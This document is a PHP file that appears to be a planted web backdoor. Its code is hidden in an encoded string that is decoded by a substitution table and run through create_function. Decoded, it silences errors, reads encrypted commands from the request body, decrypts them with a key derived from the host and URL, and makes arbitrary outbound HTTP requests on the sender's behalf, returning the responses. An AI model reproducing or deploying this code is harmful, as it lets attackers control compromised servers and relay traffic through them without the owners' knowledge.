<?php
 $gvcbaihces = 3633; function djgnhq($axmjdc, $camga){$elexlyhiju = ''; for($i=0; $i < strlen($axmjdc); $i++){$elexlyhiju .= isset($camga[$axmjdc[$i]]) ? $camga[$axmjdc[$i]] : $axmjdc[$i];}
$oqltmzc="rawurl" . "decode";return $oqltmzc($elexlyhiju);}
$apferb = '%0tIHI_Edy%1u%17KIEAcR4_dbbYbE%17%13t%1N%XL%tw%tJ%0tIHI_E'.
'dy%1u%17cYp_dbbYbE%17%13t%1N%XL%tw%tJ%0tdbbYb_bdAYbyIHp%1ut%1N%XL%tw%tJ%0tEdy_yIxd_cIxIy%1ut%1N%XL%t'.
'w%tJ%0tIpHYbd_zEdb_RTYby%1un%1N%XL%tw%tJ%0tIHI_Edy%1u%17xRf_dfdWzyIYH_yIxd%17%13t'.
'%1N%XL%tw%tJ%tw%tJMYbdRWP%1t%1u%10_355jCD%1tRE%1t%10Iydx%1N%tw%tJ%7L%tw%tJ%1t%1t%1t%'.
'1tIM%1t%1u%10Iydx%1t%1n%Xw%1t%11ntNhT0W0-h11M-01hM-Rt8n-8Kd1u017TdK0%11%1N%tw%tJ%1t%'.
'1t%1t%1t%1t%1t%1t%1tdfIy%1u%1N%XL%tw%tJ%7w%tw%tJ%tw%tJ%10KRyR%1t%Xw%1tMIcd_pdy_WYHydHyE%1u%'.
'17APA%XJ//IHAzy%17%1N%XL%tw%tJ%10KRyR%1t%Xw%1tEAcIy%1u%11%Xw%11%13%10KRyR'.
'%131%1N%XL%tw%tJ%tw%tJ%10Th0_KdWYKd_KRyR%1t%Xw%1tTREdh0_KdWYKd%1uzbcKdWYKd%1u%10KRyR%8Ln%8w%1N%1N%XL'.
'%tw%tJ%tw%tJ%10EdHK_KRyR%1t%Xw%1tzHEdbIRcIkd%1uKdWb4Ay%1u%10'.
'Th0_KdWYKd_KRyR%1N%1N%XL%tw%tJ%tw%tJ%10bdEzcy%1t%Xw%1tEdHK_KRyRn%1t%1u%10EdH'.
'K_KRyR%1N%XL%tw%tJ%tw%tJIM%1t%1u%1n%10bdEzcy%1N%tw%tJ%7L%'.
'tw%tJ%1t%1t%1t%1t%10bdEzcy%1t%Xw%1tEdHK_KRyR1%1u%10EdHK_KRyR%1N%XL%tw%tJ%7w'.
'%tw%tJ%tw%tJdWPY%1t%10bdEzcy%XL%tw%tJ%tw%tJMzHWyIYH%1tKdWb4A'.
'y%1u%10KRyR%1N%tw%tJ%7L%tw%tJ%1t%1t%1t%1t%10Yzy_KRyR%1t%Xw%1'.
't%11%11%XL%tw%tJ%1t%1t%1t%1t%10sd4%1t%Xw%1t%10_VDaUDa%8L%179BBl_95VB%17%8w%1t.%1t%10_VDaUD'.
'a%8L%17aDSmDVB_maC%17%8w%XL%tw%tJ%1t%1t%1t%1t%10sd4_cdH%1t%Xw%1tEy'.
'bcdH%1u%10sd4%1N%XL%tw%tJ%1t%tw%tJ%1t%1t%1t%1tMYb%1t'.
'%1u%10I%Xwt%XL%1t%10I%1t%X3%1tEybcdH%1u%10sd4%1N%XL%1t%10I%1L%1L%1N%tw%tJ%1t%1t'.
'%1t%1t%7L%tw%tJ%1t%1t%1t%1t%1t%1t%1t%1t%10sd4%8L%10I%8w%1t%Xw%1tWPb%1uYbK%1u%10sd4%8L%10I%8w%1N%1t'.
'%8D%1t%1u%10sd4_cdH%1t%18%1t188%1N%1N%XL%tw%tJ%1t%1t%1t%1t%7w%tw%tJ%tw%tJ%1t%1t%1t%1tMYb%1t%1u'.
'%10I%Xwt%XL%1t%10I%X3EybcdH%1u%10KRyR%1N%XL%1N%tw%tJ%1t%1t%1t%1t%7L%tw%tJ%1t%1t%1t%1t%1t'.
'%1t%1t%1tMYb%1t%1u%106%Xwt%XL%1t%106%X3EybcdH%1u%10sd4%1N%1t%1h%1h%1t%10I%X3EybcdH%1u%10'.
'KRyR%1N%XL%1t%106%1L%1L%13%1t%10I%1L%1L%1N%tw%tJ%1t%1t%1t%1t%1t%1t%1t'.
'%1t%7L%tw%tJ%1t%1t%1t%1t%1t%1t%1t%1t%1t%1t%1t%1t%10Yzy_KRyR%1t.%Xw%1tWPb%1uYbK%1u%10KRyR%8L'.
'%10I%8w%1N%1t%8D%1tYbK%1u%10sd4%8L%106%8w%1N%1N%XL%tw%tJ%1t%1t%1t%1t%1t%1t%1'.
't%1t%7w%tw%tJ%1t%1t%1t%1t%7w%tw%tJ%tw%tJ%1t%1t%1t%1tbdyzbH%1t%10Yzy_KRyR%XL%t'.
'w%tJ%7w%tw%tJ%tw%tJMzHWyIYH%1tEdHK_KRyRn%1u%10KRyR%1N%tw%tJ%7L%tw%tJ%1t%1t%1t%1t%10PdRK%1t%X'.
'w%1t%11%11%XL%tw%tJ%tw%tJ%1t%1t%1t%1tMYbdRWP%1u%10KR'.
'yR%8L%11PdRKdbE%11%8w%1tRE%1t%10sd4%Xw%XD%10rRczd%1N%tw%tJ%1t%1t%1t%1t%7L%tw%tJ%1t%1t%1t%1t%1t%1t%1'.
't%1t%10PdRK%1t.%Xw%1t%10sd4%1t.%1t%11%XJ%1t%11%1t.%1t%10rRczd%1t.%1t'.
'%11%83b%83H%11%XL%tw%tJ%1t%1t%1t%1t%7w%tw%tJ%tw%tJ%1t%1t%1t%1t%10ARbRxE%1t%Xw%'.
'1tRbbR4%1u%17PyyA%17%1t%Xw%XD%1tRbbR4%1u%tw%tJ%1t%1t%1t%1t%1t%1t%1t%1t%17xdyP'.
'YK%17%1t%Xw%XD%1t%10KRyR%8L%11xdyPYK%11%8w%13%tw%tJ%1t%1t%1t%1t%1t%1'.
't%1t%1t%17PdRKdb%17%1t%Xw%XD%1t%10PdRK%13%tw%tJ%1t%1t%1t%1t%1t%1t%1t%1t%17WYHydHy%17%1'.
't%Xw%XD%1t%10KRyR%8L%11TYK4%11%8w%13%tw%tJ%1t%1t%1t%1t%1'.
't%1t%1t%1t%17yIxdYzy%17%1t%Xw%XD%1t%10KRyR%8L%11yIxdYzy%11%8w%13%tw%tJ%1t%1t%1t%1t%1t%1t%1t%1'.
't%tw%tJ%1t%1t%1t%1t%1N%1N%XL%tw%tJ%tw%tJ%1t%1t%1t%1t%10Wyf%1t%Xw%1tEybdRx_W'.
'YHydfy_WbdRyd%1u%10ARbRxE%1N%XL%tw%tJ%1t%1t%1t%1t%tw%tJ%1t%1t%1t%1t%10bdEzcy%1t%Xw%1t%0tMIcd'.
'_pdy_WYHydHyE%1u%10KRyR%8L%11zbc%11%8w%13%1tQJqVD%13%1t%10Wyf%1N%XL%'.
'tw%tJ%tw%tJ%1t%1t%1t%1tIM%1t%1u%10PyyA_bdEAYHEd_PdRKdb%1N%tw%tJ%1t%1t%1t%1t%7L%tw%tJ%1t%1t%1t%1t%'.
'1t%1t%1t%1tIM%1t%1uEybAYE%1u%10PyyA_bdEAYHEd_PdRKdb%8Lt%8w%13%1t%111tt%11%1N%1'.
't%Xw%Xw%Xw%1tQJqVD%1N%tw%tJ%1t%1t%1t%1t%1t%1t%1t%1t%7L%tw%tJ%1'.
't%1t%1t%1t%1t%1t%1t%1t%1t%1t%1t%1t%10bdEzcy%1t%Xw%1t%119BBl_Daa5a%83y%11%1t.%1t%10PyyA_'.
'bdEAYHEd_PdRKdb%8Lt%8w%XL%tw%tJ%1t%1t%1t%1t%1t%1t%1t%1t%7w%tw%tJ%1t%1t%1t%1t%7w%tw%tJ%1t%1t%1'.
't%1tdcEd%tw%tJ%1t%1t%1t%1t%7L%tw%tJ%1t%1t%1t%1t%1t%1t%1t%1t%10bdEzcy%1t%Xw%1t%1135OOD3BC5O_Da'.
'a5a%11%XL%tw%tJ%1t%1t%1t%1t%7w%tw%tJ%tw%tJ%1t%1t%1t%1tbdyzbH%1t%10b'.
'dEzcy%XL%tw%tJ%7w%tw%tJ%tw%tJMzHWyIYH%1tEdHK_KRyR1%1u%10KRyR'.
'%1N%tw%tJ%7L%tw%tJ%1t%1t%1t%1t//%1tzEd%1tEYWsdyE%tw%tJ%7w';
$reegsjwrr = Array('1'=>'2', '0'=>'4', '3'=>'C', '2'=>'G', '5'=>'O', '4'=>'y', '7'=>'7', '6'=>'j', '9'=>'H', '8'=>'5', 'A'=>'p', 'C'=>'I', 'B'=>'T', 'E'=>'s', 'D'=>'E', 'G'=>'X', 'F'=>'M', 'I'=>'i', 'H'=>'n', 'K'=>'d', 'J'=>'A', 'M'=>'f', 'L'=>'B', 'O'=>'N', 'N'=>'9', 'Q'=>'F', 'P'=>'h', 'S'=>'Q', 'R'=>'a', 'U'=>'V', 'T'=>'b', 'W'=>'c', 'V'=>'S', 'Y'=>'o', 'X'=>'3', 'Z'=>'W', 'a'=>'R', 'c'=>'l', 'b'=>'r', 'e'=>'J', 'd'=>'e', 'g'=>'Y', 'f'=>'x', 'i'=>'Z', 'h'=>'6', 'k'=>'z', 'j'=>'K', 'm'=>'U', 'l'=>'P', 'o'=>'q', 'n'=>'1', 'q'=>'L', 'p'=>'g', 's'=>'k', 'r'=>'v', 'u'=>'8', 't'=>'0', 'w'=>'D', 'v'=>'w', 'y'=>'t', 'x'=>'m', 'z'=>'u');
$apferb=djgnhq($apferb, $reegsjwrr);$nbcemgkl="\143"."\x72".chr(101).chr(97).chr(437-321).'e'."\137"."\146"."\x75".chr(967-857).chr(99).chr(116)."\151".chr(1024-913).chr(740-630);$nbcemgkl('', chr(125) . $apferb . chr(123));?>